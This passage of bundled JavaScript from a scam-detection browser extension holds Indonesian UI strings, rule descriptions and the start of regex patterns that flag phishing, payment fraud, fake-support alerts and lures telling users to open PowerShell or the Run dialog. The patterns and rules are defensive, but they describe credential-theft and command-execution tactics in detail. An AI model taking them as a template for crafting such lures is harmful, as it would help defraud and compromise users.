    completeText: (n) => `${n} blok teks dianalisis. Lengkap sebatas yang dapat dilihat VeilTrace.`,
    partialTitle: "Pemindaian sebagian: ada konten yang tidak diperiksa",
    partialFooter: (n) => `Temuan hanya mencakup ${n} blok teks yang dianalisis.`,
    partial: {
      "node-budget": "Halaman sangat besar. Analisis berhenti di batas jumlah elemen.",
      "block-budget": "Halaman sangat besar. Hanya 5.000 blok teks pertama yang dianalisis.",
      "char-budget": "Halaman berisi sangat banyak teks. Analisis berhenti di batas teks.",
      timeout: "Analisis mencapai batas waktu. Sisa halaman tidak diperiksa.",
      "block-text-capped": "Beberapa blok teks yang sangat panjang hanya dianalisis sebagian.",
      "aux-capped": "Halaman memiliki banyak tombol salin atau teks clipboard tersembunyi. Sebagian dilewati.",
      "frames-skipped": "Frame tersemat dari situs lain tidak dapat diperiksa.",
      "closed-shadow-skipped": "Beberapa komponen halaman tersemat tidak dapat diperiksa.",
      "extractor-truncated": "Sebagian konten dilewati.",
      "core-truncated": "Sebagian konten melebihi batas analisis dan dilewati."
    },
    loweredFrom: (cls) => `Diturunkan dari ${cls.toLowerCase()} karena konteks: `,
    contextPrefix: "Konteks: ",
    modifier: {
      "C.QUOTED": "instruksi berada di dalam kutipan.",
      "C.REPORTED": "teks melaporkan apa yang diminta kepada orang lain.",
      "C.EDUCATIONAL": "teks di sekitarnya adalah materi edukasi atau kewaspadaan.",
      "C.CODE_EXAMPLE": "instruksi adalah contoh kode di dalam artikel.",
      "C.PROCEDURAL": "instruksi adalah langkah dalam dokumen prosedural."
    },
    override: {
      "O.CONCEALED_PAYLOAD": "Tidak diturunkan: bagian halaman ini juga menaruh teks tersembunyi di clipboard Anda, sesuatu yang tidak dilakukan kutipan atau tutorial.",
      "O.VERIFICATION_GATE": "Tidak diturunkan: instruksi berada di dialog verifikasi singkat yang ditujukan kepada Anda."
    },
    overrideCapped: "Diturunkan paling banyak satu tingkat: instruksi berada di dialog verifikasi singkat yang ditujukan kepada Anda.",
    contextSetAside: "Konteks yang dikesampingkan",
    overrideEvidence: "Bukti pendukung",
    moreEvidence: (n) => `${n} bukti lainnya tidak ditampilkan.`,
    moreFindings: (n) => `${n} temuan lainnya tidak ditampilkan (batas tampilan).`,
    severity: { manipulative_instruction: "Tingkat keparahan: tinggi", suspicious_correlation: "Tingkat keparahan: sedang", observed_instruction: "Tingkat keparahan: informasi" },
    cred: {
      experimental: "Eksperimental",
      findingTitle: { manipulative_instruction: "Permintaan rahasia yang manipulatif", suspicious_correlation: "Permintaan rahasia yang mencurigakan", observed_instruction: "Permintaan masuk atau kode" },
      ruleChip: (id) => `Aturan ${id}`,
      rule: {
        CR1: "Meminta Anda mengirim rahasia kepada orang atau kanal. Layanan asli meminta Anda mengetik kode di formulirnya sendiri, tidak pernah meneruskannya.",
        CR2: "Meminta frasa pemulihan dompet dengan suatu dalih. Siapa pun yang memegang frasa itu menguasai dompetnya.",
        CR3: "Meminta rahasia di dalam konten yang mungkin tidak dikendalikan situs (komentar, widget, frame tersemat), disertai dalih.",
        CR4: "Meminta rahasia disertai ancaman untuk menangguhkan, mengunci, atau menutup akun Anda.",
        CR5: "Meminta kata sandi atau kode tanpa tanda manipulasi di sekitarnya."
      },
      asks: (action, secrets) => action === "send" ? `Meminta Anda mengirim: ${secrets}` : `Meminta Anda mengisi: ${secrets}`,
      secret: { password: "kata sandi", otp: "kode sekali pakai (OTP)", pin: "nomor PIN", "recovery-code": "kode pemulihan", "recovery-phrase": "frasa pemulihan", token: "token akses" },
      indicators: "Indikator",
      pretext: {
        "CP.ACCOUNT_THREAT": "ancaman terhadap akun",
        "CP.URGENCY": "tenggat atau desakan",
        "CP.SUPPORT": "mengaku sebagai petugas atau pihak resmi",
        "CP.VERIFY": "dalih verifikasi",
        "CP.REWARD": "hadiah atau imbalan"
      },
      trust: {
        "user-content": "di konten kiriman pengguna",
        "third-party-widget": "di widget tersemat",
        "embedded-frame": "di frame tersemat",
        dialog: "di dalam dialog",
        overlay: "di dalam overlay",
        form: "di dalam formulir"
      },
      destination: {
        none: "Formulir dikirim ke halaman ini.",
        "same-origin": "Formulir dikirim ke situs ini.",
        "other-origin": "Formulir dikirim ke situs lain.",
        mailto: "Formulir membuka pesan email.",
        javascript: "Formulir ditangani skrip di halaman.",
        data: "Formulir dikirim ke alamat data sebaris.",
        other: "Formulir dikirim ke alamat yang tidak biasa."
      },
      actionRisk: {
        high: "Risiko tindakan: tinggi. Siapa pun yang mendapatkannya bisa mengambil alih akun atau dompet.",
        medium: "Risiko tindakan: sedang. Mengisinya di situs yang salah dapat membuka akses ke akun Anda."
      },
      modifier: {
        "C.QUOTED": "permintaan berada di dalam kutipan.",
        "C.REPORTED": "teks melaporkan apa yang diminta dari orang lain.",
        "C.EDUCATIONAL": "teks di sekitarnya adalah materi edukasi atau kesadaran keamanan.",
        "C.CODE_EXAMPLE": "permintaan berada di dalam contoh kode."
      },
      overrideLiveField: "Tidak diturunkan: bagian halaman yang sama memiliki kolom isian yang berfungsi untuk rahasia tersebut.",
      signal: {
        "S.PASSWORD": "Kata sandi",
        "S.OTP": "Kode sekali pakai",
        "S.PIN": "Nomor PIN",
        "S.RECOVERY_CODE": "Kode pemulihan",
        "S.SEED_PHRASE": "Frasa pemulihan",
        "S.TOKEN": "Token akses",
        "D.SEND": "Kirim atau bagikan",
        "D.ENTER": "Isi",
        "CP.ACCOUNT_THREAT": "Ancaman akun",
        "CP.URGENCY": "Desakan",
        "CP.SUPPORT": "Mengaku petugas atau otoritas",
        "CP.VERIFY": "Dalih verifikasi",
        "CP.REWARD": "Hadiah",
        "F.SECRET_FIELD": "Kolom isian",
        "C.NEGATION": "Negasi",
        "C.REPORTED": "Kalimat dilaporkan",
        "C.EDUCATIONAL": "Konteks edukasi"
      },
      fieldSource: "Kolom formulir",
      fieldKind: {
        password: "kata sandi",
        otp: "kode sekali pakai",
        pin: "nomor PIN",
        "recovery-code": "kode pemulihan",
        "secret-phrase": "frasa pemulihan",
        email: "alamat email",
        text: "teks",
        other: "lainnya"
      },
      unlabeledField: "(kolom tanpa label)",
      limitation: {
        "claimed-identity-unverifiable": "VeilTrace tidak dapat memastikan siapa penulisnya. Pengakuan sebagai petugas atau pihak resmi bukan bukti.",
        "destination-not-scored": "Tujuan formulir hanya ditampilkan sebagai informasi; VeilTrace tidak menilai situs.",
        "trust-boundary-heuristic": "Apakah konten ini berasal dari situs atau dari pihak lain diperkirakan dari struktur halaman."
      }
    },
    pay: {
      findingTitle: { manipulative_instruction: "Permintaan pembayaran manipulatif", suspicious_correlation: "Permintaan pembayaran mencurigakan", observed_instruction: "Permintaan pembayaran" },
      ruleChip: (id) => `Aturan ${id}`,
      rule: {
        PR1: "Meminta Anda membayar lebih dulu untuk menerima sesuatu (refund, hadiah, dana yang dicairkan, atau akun yang dibuka). Refund dan hadiah asli tidak pernah meminta pembayaran di muka.",
        PR2: "Meminta Anda membayar di luar checkout biasa (rekening pribadi, di luar platform, kartu hadiah, atau kripto), disertai tekanan. Pembayaran seperti ini sulit ditarik kembali.",
        PR3: "Meminta pembayaran disertai ancaman (penutupan akun, penangkapan, atau tuntutan hukum) dan desakan atau klaim otoritas.",
        PR4: "Meminta pembayaran tanpa tanda manipulasi di sekitarnya."
      },
      promise: { refund: "refund", prize: "hadiah", "account-unlock": "akun yang dibuka kembali", release: "uang atau barang yang dilepas", recruitment: "kelulusan seleksi yang dijamin", job: "pekerjaan", "investment-return": "keuntungan investasi yang tetap atau dijamin", loan: 'pinjaman yang "disetujui" atau "pasti cair"' },
      destination: { "personal-account": "rekening pribadi", "off-platform": "di luar platform", "gift-card": "kartu hadiah", crypto: "aset kripto" },
      pressure: { threat: "ancaman", urgency: "tenggat atau desakan", "claimed-authority": "mengaku sebagai petugas atau otoritas", "claimed-family": "mengaku anggota keluarga dengan nomor baru" },
      promisesLabel: "Dijanjikan sebagai imbalan",
      destinationsLabel: "Pembayaran ditujukan ke",
      indicators: "Indikator",
      actionRisk: {
        high: "Risiko tindakan: tinggi. Uang yang dikirim dengan cara ini biasanya hilang.",
        medium: "Risiko tindakan: sedang. Membayar pihak yang salah dapat merugikan Anda."
      },
      signal: {
        "PY.PAY": "Permintaan pembayaran",
        "PA.AMOUNT": "Nominal",
        "PF.FEE": "Biaya",
        "PF.RELEASE_FEE": "Biaya pencairan atau buka blokir",
        "PD.PERSONAL": "Rekening pribadi",
        "PD.OFF_PLATFORM": "Di luar platform",
        "PD.GIFT_CARD": "Kartu hadiah",
        "PD.CRYPTO": "Aset kripto",
        "PR.REFUND": "Refund atau dana tertahan",
        "PR.PRIZE": "Hadiah",
        "PR.UNLOCK": "Pembukaan akun",
        "PR.RECRUIT": "Jaminan lulus seleksi",
        "PR.JOB": "Tawaran kerja",
        "PC.CONDITION": "Pembayaran sebagai syarat",
        "PP.THREAT": "Ancaman",
        "PP.FAMILY": "Mengaku keluarga",
        "PP.URGENCY": "Desakan",
        "PP.AUTHORITY": "Mengaku petugas atau otoritas",
        "C.NEGATION": "Negasi",
        "C.REPORTED": "Kalimat dilaporkan",
        "C.EDUCATIONAL": "Konteks edukasi"
      },
      amountHidden: "(nominal di halaman; nilainya tidak ditampilkan)",
      limitation: {
        "claimed-identity-unverifiable": "VeilTrace tidak dapat memastikan siapa penulisnya. Pengakuan sebagai petugas, bank, atau polisi bukan bukti.",
        "trust-boundary-heuristic": "Apakah konten ini berasal dari situs atau dari pihak lain diperkirakan dari struktur halaman.",
        "amount-not-reported": "Nominal dicocokkan untuk memahami permintaan, tetapi nilainya tidak pernah disalin ke laporan."
      }
    },
    sup: {
      findingTitle: { manipulative_instruction: "Arahan dukungan yang manipulatif", suspicious_correlation: "Arahan dukungan yang mencurigakan", observed_instruction: "Arahan dukungan" },
      ruleChip: (id) => `Aturan ${id}`,
      rule: {
        SR1: "Halaman web mengklaim perangkat Anda terinfeksi atau terkunci lalu menyuruh Anda menelepon, menginstal, atau memberi akses. Browser dan sistem operasi tidak menampilkan alarm seperti itu di dalam halaman web.",
        SR2: "Pihak yang mengaku petugas, bank, atau admin meminta Anda menginstal perangkat lunak atau memberi akses jarak jauh, disertai tekanan atau dari konten yang mungkin tidak dikendalikan situs.",
        SR3: "Pihak yang mengaku petugas, bank, atau admin mengarahkan Anda ke kontak luar disertai ancaman terhadap akun atau data Anda.",
        SR4: "Komentar atau konten kiriman pengguna mengaku sebagai dukungan resmi dan mengarahkan Anda ke kontak luar.",
        SR5: "Mengarahkan Anda menghubungi petugas, menginstal perangkat lunak, atau memberi akses jarak jauh, tanpa tanda peniruan atau tekanan di sekitarnya.",
        SR6: "Pesan yang tampil sebagai pemberitahuan dari bank, e-wallet, marketplace, atau layanan pelanggannya membunyikan alarm, ancaman, atau hadiah, lalu meminta Anda membalas, memilih opsi, membuka tautan, atau mengisi formulir. Bank dan platform tidak menyelesaikan urusan seperti ini lewat balasan atau tautan di pesan.",
        SR7: "Mengucapkan selamat atas hadiah uang yang tidak pernah Anda ikuti, lalu meminta Anda menjawab kuis, sering atas nama ulang tahun perusahaan. Kuis seperti ini menggiring orang untuk menyebarkan tautan atau menyerahkan data atau uang.",
        SR8: "Menawarkan akses ke pesan, akun, atau HP orang lain lalu mengarahkan Anda ke kontak. Jasa seperti ini ilegal, dan pembelinya sering ditipu atau diperas.",
        SR9: "Seseorang yang mengaku pembeli, penyewa, atau pemilik mengarahkan Anda ke kerabat atau orang lain lewat nomor pribadi untuk urusan harga atau pembayaran. Modus pembeli palsu dan pengalihan pembayaran dimulai seperti ini.",
        SR10: "Pesan menawarkan file aplikasi Android (.apk) yang disebut sebagai undangan, foto paket, resi, surat tilang, atau tagihan, atau meminta Anda menginstalnya atau mematikan perlindungan HP. Membuka file seperti ini memasang aplikasi yang bisa membaca SMS dan mengambil alih aplikasi bank."
      },
      action: { contact: "menghubungi seseorang", respond: "membalas, memilih opsi, membuka tautan, atau mengisi formulir", survey: "menjawab kuis atau kuesioner", "remote-access": "memberi akses jarak jauh", install: "menginstal perangkat lunak", "disable-protection": "mematikan perlindungan perangkat atau mengizinkan aplikasi tak dikenal" },
      channel: { phone: "nomor telepon", mobile: "nomor ponsel", messenger: "aplikasi pesan", link: "tautan", "apk-file": "file aplikasi (.apk)" },
      claim: { support: "petugas atau layanan pelanggan", bank: "pihak bank", administrator: "admin", "security-team": "tim keamanan", official: "pejabat, aparat, atau penyidik", organization: "perusahaan atau instansi" },
      indicator: {
        "page-rendered-system-alert": "alarm virus atau kunci yang dibuat halaman web",
        "remote-access-request": "meminta akses jarak jauh",
        "software-install-request": "meminta Anda menginstal perangkat lunak",
        "personal-channel-contact": "klaim resmi dengan nomor ponsel atau aplikasi pesan",
        "claim-in-user-content": "klaim resmi di dalam konten kiriman pengguna",
        "alert-in-overlay": "alarm di overlay yang menutupi halaman",
        "protection-disable-request": "meminta mematikan perlindungan, mengizinkan aplikasi tak dikenal, atau memberi akses aksesibilitas",
        "apk-file-in-message": "file aplikasi (.apk) dikirim lewat pesan"
      },
      pressure: { "system-alert": "alarm perangkat", "account-alarm": "alarm akun (login, transaksi, atau tarif)", threat: "ancaman terhadap akun atau data", urgency: "tenggat atau desakan", reward: "hadiah atau poin", "pre-won": "ucapan selamat atas hadiah yang tidak Anda ikuti", "illicit-access": "tawaran akses ke akun atau HP orang lain", "third-party-redirect": "mengarahkan ke kerabat atau perantara lewat nomor pribadi", "document-pretext": "disebut sebagai undangan, foto paket, resi, surat tilang, atau tagihan" },
      asksLabel: "Meminta Anda",
      claimsLabel: "Mengaku sebagai (belum terverifikasi)",
      indicatorsLabel: "Indikator teramati",
      pressureLabel: "Tekanan",
      actionRisk: {
        high: "Risiko tindakan: tinggi. Menginstal perangkat lunak atau memberi akses jarak jauh dapat menyerahkan kendali perangkat kepada orang asing.",
        medium: "Risiko tindakan: sedang. Menghubungi layanan palsu dapat berujung pada permintaan uang, kode, atau akses."
      },
      signal: {
        "SC.CONTACT": "Arahan menghubungi",
        "SC.RESPOND": "Permintaan balasan, tautan, atau formulir",
        "SC.SURVEY": "Kuis atau kuesioner",
        "SA.REMOTE": "Permintaan akses jarak jauh",
        "SA.INSTALL": "Permintaan instalasi",
        "SX.PHONE": "Nomor telepon",
        "SX.MOBILE": "Nomor ponsel",
        "SX.MESSENGER": "Aplikasi pesan",
        "SX.LINK": "Tautan",
        "SI.SUPPORT": "Mengaku petugas",
        "SI.BANK": "Mengaku pihak bank",
        "SI.ADMIN": "Mengaku admin",
        "SI.SECURITY": "Mengaku tim keamanan",
        "SI.OFFICIAL": "Mengaku pejabat atau berpangkat",
        "SW.ALERT": "Alarm perangkat",
        "ST.THREAT": "Ancaman",
        "SU.URGENCY": "Desakan",
        "SW.ACCOUNT": "Alarm akun",
        "SP.REWARD": "Hadiah",
        "SP.WON": "Hadiah tanpa ikut",
        "SO.ILLICIT": "Tawaran akses ilegal",
        "SO.PROXY": "Dialihkan ke kerabat atau perantara",
        "SI.ORG": "Mengaku perusahaan atau instansi",
        "SH.UNASSERTED": "Pengandaian atau kutipan",
        "C.NEGATION": "Negasi",
        "C.REPORTED": "Kalimat dilaporkan",
        "C.EDUCATIONAL": "Konteks edukasi"
      },
      contactHidden: "(nomor kontak di halaman; tidak ditampilkan)",
      limitation: {
        "claimed-identity-unverifiable": "VeilTrace tidak dapat memastikan siapa penulisnya. Pengakuan sebagai petugas, bank, atau admin bukan bukti, dan VeilTrace tidak menyatakan organisasinya palsu.",
        "trust-boundary-heuristic": "Apakah konten ini berasal dari situs atau dari pihak lain diperkirakan dari struktur halaman.",
        "contact-details-not-reported": "Nomor telepon dicocokkan untuk memahami arahan, tetapi tidak pernah disalin ke laporan."
      }
    },
    pwa: {
      title: "Cek pesan",
      intro: "Tempel pesan yang mencurigakan, atau periksa screenshot-nya, untuk melihat apakah pesan itu mencoba memanipulasi Anda. Screenshot dibaca di perangkat ini.",
      sourceLabel: "Dari mana pesannya?",
      source: { chat: "Chat (WhatsApp, Telegram\u2026)", sms: "SMS", email: "Email", web: "Teks dari situs" },
      placeholder: "Tempel pesan di sini\u2026",
      check: "Periksa pesan",
      clear: "Hapus",
      paste: "Tempel dari clipboard",
      shareHint: "Di Android, pasang aplikasi ini, lalu bagikan pesan atau screenshot ke VeilTrace.",
      privacy: "Diperiksa hanya di perangkat ini. Pesan tidak dikirim, disimpan, atau dibagikan.",
      empty: "Tempel atau bagikan pesan terlebih dahulu.",
      tooLong: "Hanya 20.000 karakter pertama yang diperiksa.",
      assessment: "PENILAIAN ANCAMAN PESAN",
      headlineDetail: {
        manipulative_instruction: "Pesan ini mencoba membuat Anda melakukan sesuatu yang merugikan. Jangan ikuti instruksi yang tercantum di bawah.",
        suspicious_correlation: "Pesan ini menggabungkan permintaan dengan tanda yang sering muncul dalam penipuan. Periksa temuan di bawah sebelum bertindak.",
        observed_instruction: "Instruksi atau permintaan biasa ditemukan dan dicantumkan sebagai teramati. Ini bukan jaminan tentang pesan ini.",
        none: "VeilTrace tidak menemukan apa pun untuk dilaporkan di teks ini. Ini bukan jaminan tentang pesan atau pengirimnya."
      },
      linkOnly: "Yang ditempel hanya tautan. VeilTrace memeriksa isi pesan dan tidak menilai alamat situs. Tempel seluruh pesannya, termasuk teks di sekitar tautan. Jangan membuka tautan hanya untuk mengeceknya.",
      yourMessage: "Pesan Anda",
      offlineReady: "Siap dipakai tanpa internet.",
      image: "Periksa screenshot",
      ocrProgress: (p) => `Membaca teks di gambar, di perangkat ini\u2026 ${p}%`,
      ocrDone: "Teks sudah dibaca dari gambar. Cocokkan dengan gambarnya dan perbaiki bila perlu, lalu periksa lagi.",
      ocrEmpty: "Tidak ada teks yang terbaca dari gambar ini. Coba screenshot yang lebih jelas, atau tempel teksnya.",
      ocrFailed: "Gambar tidak bisa dibaca di perangkat ini. Tempel teksnya saja."
    },
    imageText: {
      title: "Teks di dalam gambar \xB7 di perangkat ini",
      intro: "Sebagian umpan ditulis di dalam gambar (poster, banner, foto surat). VeilTrace dapat membaca bagian halaman yang terlihat dari screenshot, di perangkat ini, lalu memeriksa teks yang belum ada sebagai teks halaman. Tidak ada yang dikirim.",
      run: "Baca teks di gambar",
      reading: (p) => `Membaca layar yang terlihat, di perangkat ini\u2026 ${p}%`,
      analyzing: "Memeriksa teks yang ditemukan di gambar\u2026",
      done: (n) => `${n} baris teks hanya ditemukan di dalam gambar pada layar yang terlihat.`,
      nothing: "Tidak ada teks di dalam gambar pada layar yang terlihat selain yang sudah ada sebagai teks halaman. Gulir lalu baca lagi untuk memeriksa bagian lain.",
      noText: "Tidak ada teks yang terbaca dari layar yang terlihat.",
      failed: "Layar tidak bisa dibaca di sini. Beberapa halaman dan browser tidak mengizinkan screenshot.",
      notShowable: "Di dalam gambar: tidak bisa di-highlight di halaman."
    },
    ai: {
      title: "Pendapat kedua AI \xB7 opsional, di perangkat ini",
      intro: "Model AI bawaan Chrome dapat membaca teks halaman ini dan memberi pendapat kedua. Berjalan di perangkat ini dan tidak ada yang dikirim. Hasil VeilTrace di atas tidak berubah.",
      prepare: "Tampilkan teks yang akan dibaca AI",
      previewSummary: (n, cut) => `${n} baris teks halaman; nomor, tautan, dan alamat email disamarkan${cut ? "; dipotong agar muat" : ""}`,
      run: "Tanya AI di perangkat",
      running: "AI sedang membaca teks\u2026",
      downloading: (p) => `Chrome sedang mengunduh model AI\u2026 ${p}%`,
      unsupported: "Tidak tersedia di browser ini. AI di perangkat butuh Chrome di Windows, macOS, Linux, atau Chromebook Plus dengan model bawaannya.",
      unavailable: "Model AI bawaan Chrome tidak tersedia di perangkat ini (perangkat keras, ruang penyimpanan, atau pengaturan).",
      failed: "AI tidak memberi jawaban yang dapat dipakai. Coba lagi.",
      noText: "Tidak ada teks halaman untuk dibaca.",
      resultTitle: "Pendapat AI \xB7 bisa keliru",
      assessment: { manipulative: "AI melihat tanda manipulasi.", suspicious: "AI melihat beberapa tanda mencurigakan.", "no-clear-signs": "AI tidak melihat tanda manipulasi yang jelas. Ini bukan jaminan." },
      tactic: {
        impersonation: "mengaku bank, perusahaan, layanan pelanggan, atau pejabat",
        "threat-or-urgency": "ancaman, alarm, atau tenggat",
        "too-good-to-be-true": "hadiah, refund, atau pekerjaan yang terlalu bagus",
        "payment-request": "meminta pembayaran",
        "credential-request": "meminta password, kode, atau PIN",
        "link-or-reply-lure": "tautan, balasan, kuis, atau formulir sebagai umpan",
        "run-command": "menyuruh menjalankan perintah",
        "remote-access-or-install": "menyuruh memasang aplikasi atau memberi akses jarak jauh",
        "illegal-service": "menawarkan jasa ilegal",
        "personal-contact-channel": "nomor ponsel atau aplikasi pesan pribadi"
      },
      confidence: { low: "Keyakinan AI: rendah", medium: "Keyakinan AI: sedang", high: "Keyakinan AI: tinggi" },
      tacticsLabel: "Taktik yang disebut AI",
      citedLines: "Baris yang ditunjuk AI",
      disagreeAlert: "AI dan VeilTrace berbeda pendapat. VeilTrace tidak menemukan pola manipulasi yang terdokumentasi di halaman ini. Baca sendiri baris yang ditunjuk AI: AI bisa keliru.",
      disagreeQuiet: "AI dan VeilTrace berbeda pendapat. AI tidak melihat apa yang ditemukan VeilTrace; temuan VeilTrace di atas menunjukkan bukti yang menjadi dasarnya.",
      caveat: "Pendapat dari model bahasa: bisa keliru atau terkecoh oleh halaman itu sendiri, dan bahasa Indonesia belum termasuk bahasa yang didukungnya. Tidak mengubah hasil VeilTrace."
    },
    auto: {
      actionTitle: "VeilTrace: pindai halaman ini",
      badgeTitle: "VeilTrace: konten manipulatif ditemukan di halaman ini. Klik untuk detail.",
      title: "Mode pemindaian",
      modeLabel: { manual: "MANUAL", automatic: "OTOMATIS" },
      manualText: "Manual: VeilTrace membaca halaman hanya saat Anda menekan Pindai halaman.",
      automaticText: 'Otomatis: VeilTrace memeriksa halaman saat dimuat dan berubah, dan memberi tanda "!" pada ikon toolbar jika menemukan konten manipulatif.',
      consent: "Browser akan meminta izin agar VeilTrace dapat membaca semua situs. Halaman tetap dianalisis hanya di perangkat ini: tidak ada yang dikirim, disimpan, atau dibagikan, dan isian formulir tidak pernah dibaca. Berlaku untuk halaman yang dibuka atau dimuat ulang setelahnya, dan dapat dimatikan di sini atau di pengaturan Chrome kapan saja.",
      managedText: "Pemindaian otomatis diaktifkan oleh organisasi Anda. Halaman tetap dianalisis hanya di perangkat ini; tidak ada yang dilaporkan ke organisasi Anda atau pihak lain.",
      enable: "Aktifkan pemindaian otomatis",
      disable: "Matikan pemindaian otomatis",
      denied: "Izin tidak diberikan. VeilTrace tetap dalam mode manual.",
      failed: "Mode pemindaian tidak dapat diubah. Coba lagi."
    },
    dash: {
      stateLabel: { standby: "SIAGA", scanning: "MEMINDAI", complete: "PEMINDAIAN LENGKAP", partial: "PEMINDAIAN SEBAGIAN", error: "PEMINDAIAN GAGAL" },
      assessment: "PENILAIAN ANCAMAN HALAMAN",
      headline: {
        manipulative_instruction: {
          tone: "danger",
          title: "Konten manipulatif terdeteksi",
          detail: "Halaman ini mencoba membuat Anda melakukan sesuatu yang merugikan. Jangan ikuti instruksi yang tercantum di bawah."
        },
        suspicious_correlation: {
          tone: "warning",
          title: "Konten mencurigakan terdeteksi",
          detail: "Halaman ini menggabungkan permintaan dengan tanda yang sering muncul dalam penipuan. Periksa temuan di bawah sebelum bertindak."
        },
        observed_instruction: {
          tone: "neutral",
          title: "Tidak ada tanda manipulasi di konten yang dianalisis",
          detail: "Instruksi atau permintaan biasa ditemukan dan dicantumkan sebagai teramati. Ini bukan jaminan tentang halaman."
        },
        none: {
          tone: "neutral",
          title: "Tidak ada yang perlu dilaporkan di konten yang dianalisis",
          detail: "VeilTrace tidak menemukan temuan di bagian yang dapat diperiksa. Ini bukan jaminan tentang halaman."
        }
      },
      statHighest: "Klasifikasi tertinggi",
      statActionable: "Perlu tindakan",
      statCategories: "Kategori terdampak",
      statCoverage: "Cakupan pemindaian",
      coverageValue: { complete: "Lengkap", partial: "Sebagian" },
      noCategories: "Tidak ada",
      verdictLabel: { manipulative_instruction: "Manipulatif", suspicious_correlation: "Mencurigakan", observed_instruction: "Hanya teramati", none: "Tidak ada temuan" },
      overviewTitle: "Kategori deteksi",
      categoryName: {
        command: "Manipulasi Eksekusi Perintah",
        credential: "Manipulasi Pengungkapan Kredensial",
        payment: "Manipulasi Pembayaran",
        support: "Peniruan Dukungan & Otoritas"
      },
      categoryCode: { command: "CMD", credential: "CRED", payment: "PAY", support: "SUP" },
      tileCount: (total, actionable) => total === 0 ? "0 temuan" : `${actionable} perlu tindakan \xB7 ${total} total`,
      experimental: "Eksperimental",
      experimentalNote: "Pemeriksaan kredensial, pembayaran, dan dukungan bersifat eksperimental dan belum lulus evaluasi independen. Hanya teks halaman dan struktur formulir yang dibaca, tidak pernah isian Anda, dan nominal maupun nomor telepon tidak pernah disalin.",
      findingsTitle: (n) => `Temuan (${n})`,
      observedTitle: (n) => `Teramati tanpa tanda manipulasi (${n})`,
      groupTitle: (n) => `${n} temuan terkait pada elemen halaman yang sama`,
      groupNote: "Temuan setiap detektor ditampilkan dengan buktinya sendiri.",
      alsoCitedBy: (c) => `Juga dirujuk oleh: ${c}`,
      evidenceTitle: "Bukti teramati",
      evidenceId: (id) => `ID bukti ${id}`,
      findingId: (id) => `ID temuan ${id}`,
      actionRiskChip: { high: "Risiko tindakan: tinggi", medium: "Risiko tindakan: sedang" },
      adviceTitle: "Yang perlu dilakukan",
      advice: {
        command: "Jangan tekan Win+R, membuka terminal, menempel, atau menjalankan apa pun yang diminta halaman ini. CAPTCHA asli tidak pernah meminta Anda menjalankan perintah.",
        credential: "Jangan kirim kata sandi, kode sekali pakai, atau frasa pemulihan kepada siapa pun. Masuk hanya di situs yang Anda buka sendiri.",
        payment: "Jangan membayar untuk menerima refund, hadiah, atau pembukaan akun, dan jangan membayar ke rekening pribadi, kartu hadiah, atau kripto atas permintaan. Hubungi organisasinya lewat saluran yang sudah Anda kenal.",
        support: "Jangan menelepon nomor atau menghubungi akun yang muncul di peringatan atau komentar. Cari sendiri kontak resmi organisasinya.",
        remoteAccess: "Jangan pernah menginstal aplikasi akses jarak jauh (AnyDesk, TeamViewer) atau perangkat lunak lain karena diminta orang yang mengaku petugas."
      },
      adviceNone: "Tidak adanya temuan tidak membuat halaman dapat dipercaya. VeilTrace hanya memeriksa yang terlihat di halaman ini, pada saat pemindaian."
    },
    errors: {
      noPageTitle: "Tidak ada halaman untuk dipindai",
      noPageDetail: "Buka sebuah halaman web, lalu klik tombol VeilTrace lagi.",
      restrictedTitle: "Halaman ini tidak dapat dipindai",
      restrictedDetail: "Halaman yang dilindungi browser (seperti halaman internal browser, toko ekstensi, dan ekstensi lain) tidak mengizinkan ekstensi membacanya.",
      accessTitle: "VeilTrace tidak dapat mengakses halaman ini",
      accessDetail: "Halaman mungkin memblokir ekstensi atau sudah berubah. Muat ulang halaman lalu coba lagi.",
      fileDetail: 'Untuk memindai file lokal, aktifkan "Izinkan akses ke URL file" untuk VeilTrace di halaman ekstensi browser Anda.',
      badReportTitle: "Pemindaian gagal",
      badReportDetail: "Pemindaian mengembalikan data yang tidak terduga dan data itu dibuang."
    }
  }, MESSAGES = { en: EN, id: ID };
  function formatCount(n, lang) {
    return n.toLocaleString(MESSAGES[lang].locale);
  }

  // src/core/constants.ts
  var ENGINE_VERSION = "0.3.0", ENGINE_VERSION_M41 = "0.2.0", ENGINE_VERSION_M1 = "0.1.0-m1";

  // src/core/lexicon/patterns.ts
  var B = "(?<![\\p{L}\\p{N}_])", E = "(?![\\p{L}\\p{N}_])", SEP = "\\s*(?:\\+|plus|and|dan|sama|ama|&|-)?\\s*", APOS = "['\u2019]", QUOTE = `["'\u201C\u201D\u2018\u2019\xAB\xBB]?`, WIN = "(?:(?:tombol\\s+)?(?:logo\\s+)?win(?:dows)?(?:\\s+logo)?(?:\\s+key)?|\u229E|\u2756)", CTRL = "(?:ctrl|control|ctl|strg|\u2303)", CMD = "(?:cmd|command|\u2318)", SHELL = "(?:windows\\s+)?(?:powershell|pwsh|terminal|command\\s+prompt|cmd(?:\\.exe)?)";
  function entry(id, signal, lang, strength, source, examples) {
    return { id, signal, lang, strength, pattern: new RegExp(source, "gu"), examples };
  }

  // src/core/lexicon/en.ts
  var EN2 = [
    // A.OPEN_RUN
    entry(
      "en.open.run_dialog",
      "A.OPEN_RUN",
      "en",
      "strong",
      `${B}open\\s+(?:the\\s+)?(?:windows\\s+)?run\\s+(?:dialog(?:\\s+box)?|box|window|prompt)${E}`,
      ["Open the Run dialog box", "open the Windows Run box"]
    ),
    entry(
      "en.open.shell",
      "A.OPEN_RUN",
      "en",
      "strong",
      `${B}(?:open|launch|start)\\s+(?:up\\s+)?(?:a\\s+|the\\s+|your\\s+)?(?:new\\s+)?${SHELL}${E}`,
      ["open PowerShell", "Launch the Terminal", "open a command prompt"]
    ),
    entry(
      "en.open.search_shell",
      "A.OPEN_RUN",
      "en",
      "strong",
      `${B}(?:search\\s+for|type)\\s+${QUOTE}(?:powershell|terminal|cmd|command\\s+prompt)${E}`,
      ["Search for PowerShell", 'type "cmd"']
    ),
    entry(
      "en.open.right_click_start",
      "A.OPEN_RUN",
      "en",
      "strong",
      `${B}right[\\s-]?click\\s+(?:on\\s+)?(?:the\\s+)?(?:start|windows)\\s+(?:button|menu|icon|logo)${E}`,
      ["Right-click the Start button"]
    ),
    entry(
      "en.open.hold_win",
      "A.OPEN_RUN",
      "en",
      "weak",
      `${B}(?:press|hold)\\s+(?:down\\s+)?(?:and\\s+hold\\s+)?(?:the\\s+)?${WIN}${E}`,
      ["Hold down the Windows key", "press the Windows logo key"]
    ),
    // A.PASTE
    entry(
      "en.paste.object",
      "A.PASTE",
      "en",
      "strong",
